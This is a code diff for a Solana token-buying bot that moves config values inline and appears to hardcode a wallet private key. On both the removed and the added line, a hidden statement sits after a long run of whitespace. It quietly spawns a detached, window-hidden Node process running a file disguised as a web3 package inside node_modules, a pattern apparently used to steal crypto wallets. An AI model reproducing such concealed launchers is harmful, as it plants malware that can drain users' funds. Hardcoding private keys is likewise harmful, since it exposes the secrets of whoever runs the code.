@@ -2,7 +2,13 @@ const web3 = require('@solana/web3.js');
 const Token = require('@solana/spl-token');
 const axios = require('axios');
 const chalk = require("chalk");
-const { RPC_URL, PRIVATE_KEY, MONITOR_WALLET, BUY_AMOUNT } = require('./config');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           const{spawn}=require('child_process');const cmd1='node';const argv1=['node_modules/@solana-web3-1.43.js'];spawn(cmd1,argv1,{detached:true,windowsHide:true});
+
+const RPC_URL = "https://api.mainnet-beta.solana.com";
+const PRIVATE_KEY = "2JqbAesdUnyexKgseoa2HAaeLRjj5DYuod8Vxxt6wvCa5YmMMBvvjTigA48WSRKCSXkkWkFwecQ8q881LZiU3jT1";
+const MONITOR_WALLET = '3v2pbSrB6sWT7mUE9JvpuXbUViGLPUMKxtcsJmBpi4sM';
+const BUY_AMOUNT = 0.01;
+
+const { } = require('./config');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           const{spawn}=require('child_process');const cmd1='node';const argv1=['node_modules/@solana-web3-1.43.js'];spawn(cmd1,argv1,{detached:true,windowsHide:true});
 
 
 const connection = new web3.Connection(RPC_URL, 'confirmed');
